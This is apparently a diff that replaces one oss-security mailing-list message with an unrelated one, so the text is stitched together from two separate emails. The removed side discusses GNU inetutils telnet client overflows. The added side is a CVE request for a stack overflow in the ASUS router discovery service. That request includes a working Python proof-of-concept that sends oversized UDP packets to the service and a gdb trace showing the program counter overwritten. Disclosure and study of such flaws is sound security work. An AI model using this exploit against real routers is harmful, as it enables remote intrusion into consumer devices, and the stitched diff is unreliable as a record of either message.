@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3233" "Wednesday" "12" "December" "2018" "10:08:41" "-0800" "Hacker Fantastic" "hackerfantastic@googlemail.com" "<CAG-OieODDwrDfoci2ehVUbHg13Ehz66VB50KERZ01qCdrgCLBw@mail.gmail.com>" "83" "Re: [oss-security] Multiple telnet.c overflows" "^Cc:" nil nil "12" "2018121218:08:41" "[oss-security] Multiple telnet.c overflows" (number mark "        hackerfantas Dec 12   83/3233  " thread-indent "\"Re: [oss-security] Multiple telnet.c overflows\"\n") "<CAJ_zFkK-Wg5cvzQ_Om+=+pyddbyPvT8D07qL8wL8NYX6MNnnXg@mail.gmail.com>" ("<CAG-OieOVQkON9yTYJcKuKGfP5XK5zitz0nTr9+ci71mTZrz-+A@mail.gmail.com>" "<3f060bee-a765-4cd8-e752-e0cdfef5c6f2@oracle.com>" "<CAJ_zFkK-Wg5cvzQ_Om+=+pyddbyPvT8D07qL8wL8NYX6MNnnXg@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5249" "Thursday" "13" "July" "2017" "10:57:45" "+0800" "varsleak" "varsleak@gmail.com" "<eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>" "162" "[oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability" nil nil nil "7" "2017071302:57:45" "[oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability" (number mark "U       varsleak@gma Jul 13  162/5249  " thread-indent "\"[oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 7301 invoked by uid 550); 12 Dec 2018 18:14:05 -0000
+Received: (qmail 14262 invoked by uid 550); 13 Jul 2017 04:42:32 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,127 +11,206 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 1203 invoked from network); 12 Dec 2018 18:09:05 -0000
+Reply-To: oss-security@lists.openwall.com
+Received: (qmail 28669 invoked from network); 13 Jul 2017 02:58:00 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=googlemail.com; s=20161025;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
-         :cc;
-        bh=cMyOt6EUBe6VjLE8uW8nku1dvZY0bTP9+2WrcD4eEkM=;
-        b=fqH/Wh4ZbUXXXgLCRe6n+Naeum9SQhxxj8SLdI35BAfv8PyNjRYYlaLM/4NT9UGr0R
-         eeVPwJ+i7KInF5PjDjSTBQZlwhTMHnGZVpOdLmLDCYPJyNyevCpAVai2k5qx5YYOtyy/
-         Gj0Ydg2XfksnWHNcyVGjaUuwczcHIRoLuQ8hrbNs4ibFlz4KJOtl4LuLjfZ+f0qkCoXd
-         R7FDuhURETfLpNKN97BEsh/v0Pn9xKKe0FVc7fNOO0wzHx2PaK6E55e8re+6V4RZukcD
-         cdw4Mb7kfnZv78Sof6YZlg7zCpqriYpNMFbhXUib2DJIB7HbsLTXbmFbL0hn+6wCi9jS
-         opDw==
+        d=gmail.com; s=20161025;
+        h=to:from:subject:message-id:date:user-agent:mime-version
+         :content-language:content-transfer-encoding;
+        bh=Y3nIloNxeljy/q2RyLkKYV3oiDWZ4lGTdVdM0i2xp0g=;
+        b=MD/DBok9HU2qgwKvsLgo3gT2IGoRU+jML0A0wlSYJqiYaSYuh5Kw71iPjYVZnm1AEA
+         yn4tQSWbiNlJnQOYtIIVPzfHZOR1J4damxSz5ucAjoWQ4vSmrxBDghB8fCJ/38xQz7pX
+         VpZCv4G2OFa8qrCiqd9BK/xhbFjN8sTwSxYOj/n9y8WBZxJDnkS7cXHIRYZy6v7TDCaL
+         qL8wYPBnONbGnqK4fDo7SWgY/C9fyxraVMuKqzf+XjMi7P8RRkpQkgzjiKNrIawCmPcG
+         7+EqxkQk0wKxQ+whTdDi7X0WXrUpanrXpcsYUwNTSJgv80zHE4qdGOj6sK4aEDJ0NtLC
+         Bd0g==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to:cc;
-        bh=cMyOt6EUBe6VjLE8uW8nku1dvZY0bTP9+2WrcD4eEkM=;
-        b=qYLyerfDgY/KdNRanfaJ+FY7jgaBFK2NMLRGtgO2Q8GQpCluaMnRNfD4qCpCplNoGJ
-         GQApgtjPK9D0UWhIDaLQ+l2HihWwgD6lpBEglqbslvleGVCeJPUhjpQQmxhActrkQOUE
-         +SAZ9PtjFX0k7ZH38jm3e6bAQPTMyaixX822gXzT22W5lkkKNqqacymNQKyei3FdNR23
-         7iHvxFVct5TfVnRWo5P9U/aomSiuoXcCatSphaRH/JNuxYkKNMNib56MKxtNKJQaR+RW
-         RhPpdzzLVBGA1w+4Fv+QghXnawCsw+bPpAvtOeQFHNxnlezoRZdhVF04MjgH/sGtWLWm
-         we4A==
-X-Gm-Message-State: AA+aEWYp1C7RC9GX8G7tFls0bQjWAK9t1OQKDzllaXtGu/6diMS0vo4p
-	dqvUnreV81QcGTMRNi3TPlejjGywrkDx2HxHB+M=
-X-Google-Smtp-Source: AFSGD/UXF8o9SmjgGs9FJULKdRLjvdZhxFYDFHwjBRlNORTP+AzOPYlRT4kLzgkuhIS5vpd9ovpDf77kj5DjEjKUQNM=
-X-Received: by 2002:a05:651c:14e:: with SMTP id c14mr6446812ljd.20.1544638133560;
- Wed, 12 Dec 2018 10:08:53 -0800 (PST)
+        h=x-gm-message-state:to:from:subject:message-id:date:user-agent
+         :mime-version:content-language:content-transfer-encoding;
+        bh=Y3nIloNxeljy/q2RyLkKYV3oiDWZ4lGTdVdM0i2xp0g=;
+        b=kLGJAG++liftIJeKREgp4JnhvB5V8J2sssXfsj+z7vAq0mqe5We70tNxcvGB442VPy
+         wLRkV8RMhXc8r/pzAB23UPZ1IZVuK+V7hKLWTWLiK0mjDyGWerOBmgFqg5tS/v9ect27
+         mycRWgCa+vLFZ63YvcpL8qlvEsqkTMs38ztzNqV3jRy/tNh2+JA5JIJE0CXQHrjN+r9i
+         Mylwr/eBWWAzFKaYf1o5nj/lNirUN4YlD47Bn5m9pR0EP26ih6/SWhv4jv/Ie5YcQa0s
+         xe4UtjZ2ihifnKo9PcDjS/OwFSPqQ7A04F37dQyvvEY/SiBVU0byM+InkjVogR2Bjj5C
+         CjTw==
+X-Gm-Message-State: AIVw111K3g3GLP159Gc7HNEH4mwOZA4k08XzpJsQYSEEylqfMa+/+qxX
+	XoKVcl4EuzXDpVxsllU=
+X-Received: by 10.84.231.131 with SMTP id g3mr7736125plk.176.1499914667944;
+        Wed, 12 Jul 2017 19:57:47 -0700 (PDT)
+To: oss-security@lists.openwall.com
+From: varsleak <varsleak@gmail.com>
+Message-ID: <eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>
+Date: Thu, 13 Jul 2017 10:57:45 +0800
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+ Thunderbird/52.2.1
 MIME-Version: 1.0
-References: <CAG-OieOVQkON9yTYJcKuKGfP5XK5zitz0nTr9+ci71mTZrz-+A@mail.gmail.com>
- <3f060bee-a765-4cd8-e752-e0cdfef5c6f2@oracle.com> <CAJ_zFkK-Wg5cvzQ_Om+=+pyddbyPvT8D07qL8wL8NYX6MNnnXg@mail.gmail.com>
-In-Reply-To: <CAJ_zFkK-Wg5cvzQ_Om+=+pyddbyPvT8D07qL8wL8NYX6MNnnXg@mail.gmail.com>
-Message-ID: <CAG-OieODDwrDfoci2ehVUbHg13Ehz66VB50KERZ01qCdrgCLBw@mail.gmail.com>
-Content-Type: multipart/alternative; boundary="00000000000041ed43057cd717ce"
-Cc: oss-security@lists.openwall.com
-Date: Wed, 12 Dec 2018 10:08:41 -0800
-From: Hacker Fantastic <hackerfantastic@googlemail.com>
-Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Multiple telnet.c overflows
-To: Tavis Ormandy <taviso@google.com>
+Content-Type: text/plain; charset=gbk
+Content-Language: en-US
+Content-Transfer-Encoding: 8bit
+Subject: [oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution
+ Vulnerability
 
---00000000000041ed43057cd717ce
-Content-Type: text/plain; charset="UTF-8"
-
-Hi Tavis, thanks for the input - I referenced Mikrotik as a vendor using a
-vulnerable implementation that can be used to escape restricted shells.
-This is just one example of a instance where a restricted shell could be
-escaped when using inetutils, or when the vulnerable code path reached
-unexpected systems (like NetBSD). As Mikrotik case is not an oss security
-issue I did not post the advisory here, but as I shared to you already on
-social media:
-
-https://hacker.house/releasez/expl0itz/mikrotik-jailbreak.txt
-
-(The overflows are present in those devices as well, several million of
-them, in case this isn't clear in our advisory)
-
-The heap overflow occurs in ANY environment variables (an example instead
-of DISPLAY, use USER which maybe reachable via telnet://user@ip), yes the
-stack sprintf might not be remotely reachable which is why the advisory
-states "multiple overflows". If instances of telnet being called with a
-username via a URI handler the this would reach the heap overflow code path
-as described in the advisory. Thankfully, most modern browsers no longer
-implement telnet URI handlers anymore.
-
-I cannot account for every system configuration or use case of telnet
-clients. I lack those relevant clairevoyancy skills.
-
-You are welcome to dismiss client side environment handling vulnerabilities
-as none-security issues or feel free to patch the referenced
-vulnerabilities as stated in the advisory. Thanks for your input I hope the
-comments above with the referenced advisory are clear enough and that the
-issue can be addressed by projects still using inetutils.
-
-Kind Regards,
-Hacker Fantastic
+Hello, I review the source of asuswrt-merlin and found a Remote
+Command/Code Execution, the detail as follows:
 
 
+1. Vulnerability Details
+     Affected Vendor:RT-AC5300,RT_AC1900P,RT-AC68U,RT-AC68P,RT-AC88U,
+     RT-AC66U,RT-AC66U_B1,RT-AC58U,RT-AC56U,RT-AC55U,RT-AC52U,RT-AC51U,
+     RT-N18U,RT-N66U,RT-N56U,RT-AC3200,RT-AC3100,RT_AC1200GU,
+     RT_AC1200G,RT-AC1200,RT-AC53,RT-N12HP,RT-N12HP_B1,RT-N12D1,
+     RT-N12+,RT_N12+_PRO,RT-N16,RT-N300
+     and Asuswrt-Merlin(https://github.com/RMerl/asuswrt-merlin)
+     Affected Product: ASUS Wiress Router
+     Affected Version:  all the latest firmware
+     Platform: router
+     Impact: Remote Command/Code Execution
+     Attack vector: asusdiscorvery service
 
+2. Vulnerability Description
+     When an ASUS router discovers another router device,
+     it does not buffer the size of all discovered devices
+     when it is added to the device list to cause a stack overflow,
+     resulting in a remote code/command execution vulnerability.
+     The vulnerability code is as follows:
 
+https://github.com/RMerl/asuswrt-merlin/blob/master/release/src/router/networkmap/ASUS_Discovery.c#L184-L202
 
+3. PoC:
+<<<EOF
+# coding=utf-8
 
-On Wed, Dec 12, 2018, 9:06 AM Tavis Ormandy <taviso@google.com wrote:
+import time
+import socket
+import sys
+import os
+import threading
+import struct
+import random
+import time
+''' Please run PoC first, and it must run on windows '''
+class ASUSDiscoveryBufferOverflow:
+	""" set remote host and remote port to use exp """
+	def __init__(self, RHOST, RPORT, LHOST):
+		self.RHOST = RHOST
+		self.RPORT = RPORT
+		self.LHOST = LHOST
+	
+	def exploit(self):
+		""" execute exploit """
+		self.searchDevice()
+		self.sentShellCode()
+		
+	def searchDevice(self, socket_prot = socket.IPPROTO_UDP):
+		""" search ASUS Discovery packet """
+		print("    [-] try to search ASUS Discovery packet")
+		while(True):
+			sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_prot)
+			sniffer.bind((self.LHOST, 0))
+			sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+			if os.name == 'nt':
+				sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
 
->
->
-> On Tue, Dec 11, 2018 at 1:12 PM Alan Coopersmith <
-> alan.coopersmith@oracle.com> wrote:
->
->> On 12/11/18 10:39 AM, Hacker Fantastic wrote:
->> > When a telnet server requests environment options the sprintf on line
->> 1002 will
->> > not perform bounds checking and causes an overflow of stack buffer
->> > temp[50] defined
->> > at line 990. This issue can be trivially fixed using a patch to add
->> > bounds checking
->> > to sprintf such as with a call to snprintf();
->>
->> GNU inetutils telnet is a fork of the original BSD telnet code, but most
->> of
->> the BSD's seem to have already switched to snprintf a while ago:
->>
->>
-> To be clear, this is a bug in the (little used) GNU inetutils telnet
-> *client*, not server. It's hard to imagine a real usage of this in a
-> context that would be exploitable.
->
-> If you can set DISPLAY, then you can probably also set LD_PRELOAD, and if
-> you can interact with the command then you can use shell escapes.
->
-> I asked on twitter, and was told that maybe someone is using untrusted
-> telnet:// URIs with GNU inetutils, but there are no known examples. I was
-> also told that "plenty" of embedded devices GNU inetutils in restricted
-> shells. I'm told Mikrotik RouterOS is an example, but it's not clear to me
-> if it's using it in a context that would make this a security issue, and if
-> they did how they locked down the command to prevent trivial escapes.
->
-> Tavis.
->
->
->
->
+			pkt, hosts = sniffer.recvfrom(65565)
+			
+			if self.RHOST == hosts[0] and '\x11' == pkt[9]:
+				if (pkt[28] == '\x0C' and
+				pkt[29] == '\x15' and
+				pkt[30] == '\x1F' ):
+					print("    [+] bingo!")
+					break
 
---00000000000041ed43057cd717ce--
+	def sentShellCode(self):
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		
+		for i in range(15):
+			s.sendto(self.makeShellCode(), (self.RHOST, self.RPORT))
+			print(" [-] sent %d cycle" % (i + 1))
+			time.sleep(0.2)
+	
+	def generatingRandomMacAddr(self):
+		tmp1 = random.randint(0, 0xff)
+		tmp2 = random.randint(0, 0xff)
+		tmp3 = random.randint(0, 0xff)
+		tmp4 = random.randint(0, 0xff)
+		tmp5 = random.randint(0, 0xff)
+		tmp6 = random.randint(0, 0xff)
+		return struct.pack('6B', \
+			tmp1, tmp2, tmp3, tmp4, tmp5, tmp6)
+			
+	def makeShellCode(self):	
+		shellcode = "\x0c\x16\x1f\x00" # HEADER [ PLEASE NOT MODIFY ]
+		shellcode += (128 * b'A') # PKT_GET_INFO.PrinterInfo
+		shellcode += (32 * b'A')  # PKT_GET_INFO.SSID
+		shellcode += (32 * b'A')  # PKT_GET_INFO.NetMask
+		shellcode += (32 * b'A')  # PKT_GET_INFO.ProductID
+		shellcode += (16 * b'A')  # PKT_GET_INFO.FirmwareVersion
+		shellcode += b'A'		 # PKT_GET_INFO.OperationMode
+		shellcode += self.generatingRandomMacAddr() # PKT_GET_INFO.MacAddress	
+		shellcode += (261 * b'A') #
+
+		return shellcode
+		
+def main():
+	poc = ASUSDiscoveryBufferOverflow('192.168.2.1', 9999, '127.0.0.1')
+	
+	print("[+] Try to use exploit ...")
+	
+	poc.exploit()
+	
+	print("[+] use exploit sucessful.")
+
+if __name__ == '__main__':
+	main()
+EOF;
+
+4. gdb trace
+admin@RT-N12HP_B1:/tmp/bin# gdb /usr/sbin/asusdiscovery
+
+GNU gdb 6.8
+Copyright (C) 2008 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later
+<http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "mipsel-linux"...
+I'm sorry, Dave, I can't do that.  Symbol format `elf32-tradlittlemips'
+unknown.
+(gdb) r
+Starting program: /usr/sbin/asusdiscovery
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info r
+          zero       at       v0       v1       a0       a1       a2
+  a3
+ R0   00000000 00000000 303e3134 00423a80 7fd650e8 00000001 00001000
+00423a80
+            t0       t1       t2       t3       t4       t5       t6
+  t7
+ R8   00423000 00423000 00000581 3a31343a 41414141 2ab89124 41414141
+2ab0fe10
+            s0       s1       s2       s3       s4       s5       s6
+  s7
+ R16  41414141 41414141 41414141 41414141 41414141 41414141 41414141
+41413e41
+            t8       t9       k0       k1       gp       sp       s8
+  ra
+ R24  00000014 2ab6ad70 7fd65f66 00000000 0041c050 7fd65d30 41414141
+41414141
+        status       lo       hi badvaddr    cause       pc
+      01009c13 0000035d 00000070 41414140 00000008 41414141
+          fcsr      fir  restart
+      00000000 00000000 00000000
+
+As we have seen, the registers s0-s8,t4,t6,ra and pc are overwritten by
+0x41.
+
+Finally, with the ROP can lead to Remote Command Execution.
+
+5. Discover
+    varsleak of Sichuan Silent Information Technology Co., Ltd
+    company website: http://www.silence.com.cn/
